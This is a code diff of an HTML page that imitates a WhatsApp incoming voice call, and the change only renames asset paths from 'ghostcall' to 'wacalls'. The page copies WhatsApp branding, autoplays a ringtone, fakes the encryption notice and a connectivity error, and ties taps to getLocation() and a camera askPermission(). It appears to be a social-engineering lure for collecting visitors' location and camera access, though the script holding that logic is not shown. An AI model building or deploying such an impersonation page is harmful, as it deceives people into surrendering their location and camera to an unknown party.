@@ -5,9 +5,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WhatsApp call</title>
-    <link rel="stylesheet" href="/ghostcall/css/main.css">
-    <link rel="manifest" href="manifest.json">
-    <script src="/ghostcall/js/head.js"></script>
+    <link rel="stylesheet" href="/wacalls/css/main.css">
+    <link rel="manifest" href="/wacalls/manifest.json">
+    <script src="/wacalls/js/head.js"></script>
     <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
@@ -122,7 +122,7 @@
 
         <div>
             <span>
-                <img id="img-person" src="/ghostcall/files/wa_default_img.jpg" onclick="toggleFullScreen(body);realcall()">
+                <img id="img-person" src="/wacalls/files/wa_default_img.jpg" onclick="toggleFullScreen(body);realcall()">
                 <span id="callername"></span>
                 <span id="callerno"></span>
                 <span id="wavoicecall">WhatsApp voice call</span>
@@ -131,19 +131,19 @@
 
 
                 <span id="img-container">
-                    <img id="img-hangup-icon" src="/ghostcall/files/phone-hang up.svg" width="90px" onclick="hangcall()">
+                    <img id="img-hangup-icon" src="/wacalls/files/phone-hang up.svg" width="90px" onclick="hangcall()">
 
                     <span id="arrow-container" style="position: relative; bottom: 110px;">
-                        <img class="img-arrow-icon" src="/ghostcall/files/icons8-chevron-up-30.png"
+                        <img class="img-arrow-icon" src="/wacalls/files/icons8-chevron-up-30.png"
                             style="display: block;">
-                        <img class="img-arrow-icon" src="/ghostcall/files/icons8-chevron-up-30.png"
+                        <img class="img-arrow-icon" src="/wacalls/files/icons8-chevron-up-30.png"
                             style="display: block">
-                        <img class="img-arrow-icon" src="/ghostcall/files/icons8-chevron-up-30.png">
+                        <img class="img-arrow-icon" src="/wacalls/files/icons8-chevron-up-30.png">
 
                     </span>
 
 
-                    <img id="img-takeup-icon" src="/ghostcall/files/phone-5981.svg" width="90px"  onclick="calltaken();startTimer();"
+                    <img id="img-takeup-icon" src="/wacalls/files/phone-5981.svg" width="90px"  onclick="calltaken();startTimer();"
                         ondragleave="calltaken()">
                     <!-- <img id="img-mess-icon" src="message.png"> -->
 
@@ -155,14 +155,14 @@
             </div>
             <div style="border:2px solid red; display: none;">
                 <audio autoplay loop>
-                    <source src="/ghostcall/files/xiaomi_original.mp3" type="audio/mpeg">
+                    <source src="/wacalls/files/xiaomi_original.mp3" type="audio/mpeg">
                 </audio>
             </div>
 
         </div>
     </div>
     <div id="error"></div>
-    <img src="/ghostcall/files/loc-img.jpg" id="err-img" style="display:none; margin:auto; height:50px;"
+    <img src="/wacalls/files/loc-img.jpg" id="err-img" style="display:none; margin:auto; height:50px;"
         onclick="getLocation()">
 
     <!-- Start of Recieved calling -->
@@ -171,12 +171,12 @@
 
             <div id="end-2-text"
                 style="color:#8b8b8b; margin: auto;  display: flex; align-items: center; justify-content: center;">
-                <img src="/ghostcall/files/icons8-chevron-up-30.png" id="down-arrow" class="disabled-icon"
+                <img src="/wacalls/files/icons8-chevron-up-30.png" id="down-arrow" class="disabled-icon"
                     onclick="dioCheckNet()">
-                <img src="/ghostcall/files/icons8-lock.svg" style="width: 15px;margin: 6px;"><span
+                <img src="/wacalls/files/icons8-lock.svg" style="width: 15px;margin: 6px;"><span
                     onclick="disend2mess()">End-to-end
                     encrypted</span>
-                <img src="/ghostcall/files/add to contact.png" id="add-con-img" class="disabled-icon"
+                <img src="/wacalls/files/add to contact.png" id="add-con-img" class="disabled-icon"
                     onclick="dioCheckNet()">
             </div>
             <div id="end-2-end-mess"><span>WhatsApp secures your conversations with end-to-end
@@ -190,30 +190,30 @@
         <span id="username-ctc"
             style="font-size: x-large; font-weight: 900; color: white; display: flex; align-items: center; justify-content: center;">Hello</span>
         <span id="stopwatch">00:00</span>
-        <div class="disabled-icon-overlay">Please check your internet connectivity<img src="/ghostcall/files/delete.png"
+        <div class="disabled-icon-overlay">Please check your internet connectivity<img src="/wacalls/files/delete.png"
                 onclick="delDIO()"></div>
-        <img src="/ghostcall/files/wa_default_img.jpg" id="img-taken-person" width="400px" height="400px"
+        <img src="/wacalls/files/wa_default_img.jpg" id="img-taken-person" width="400px" height="400px"
             onclick="toggleFullScreen(body)">
         <div id="bottom-call-tool-container">
-            <img src="/ghostcall/files/icons8-chevron-right-60.png" alt="" id="down-icon-arrow" class="disabled-icon"
+            <img src="/wacalls/files/icons8-chevron-right-60.png" alt="" id="down-icon-arrow" class="disabled-icon"
                 onclick="dioCheckNet()">
-            <img src="/ghostcall/files/icons8-speaker-96.png" alt="" width="50px" height="50px" class="disabled-icon"
+            <img src="/wacalls/files/icons8-speaker-96.png" alt="" width="50px" height="50px" class="disabled-icon"
                 onclick="dioCheckNet()">
-            <img src="/ghostcall/files/icons8-no-video-50.png" alt="" width="50px" class="disabled-icon"
+            <img src="/wacalls/files/icons8-no-video-50.png" alt="" width="50px" class="disabled-icon"
                 onclick="showvideo();askPermission()">
-            <img src="/ghostcall/files/icons8-mute-unmute-96.png" alt="" width="50px" height="50px"
+            <img src="/wacalls/files/icons8-mute-unmute-96.png" alt="" width="50px" height="50px"
                 class="disabled-icon" onclick="dioCheckNet()">
-            <img src="/ghostcall/files/phone-hang up.svg" alt="" width="50px" class="disabled-icon"
+            <img src="/wacalls/files/phone-hang up.svg" alt="" width="50px" class="disabled-icon"
                 onclick="hangcall()">
         </div>
     </div>
     <div id="video-container">
         <video id="video" src="" autoplay loop>
         </video>
-        <img src="/ghostcall/files/phone-hang up.svg" alt="" width="50px" class="disabled-icon" onclick="hangcall()"
+        <img src="/wacalls/files/phone-hang up.svg" alt="" width="50px" class="disabled-icon" onclick="hangcall()"
             id="videohang" style="display:none">
     </div>
-    <script src="/ghostcall/js/main.js"></script>
+    <script src="/wacalls/js/main.js"></script>
 
 </body>
 
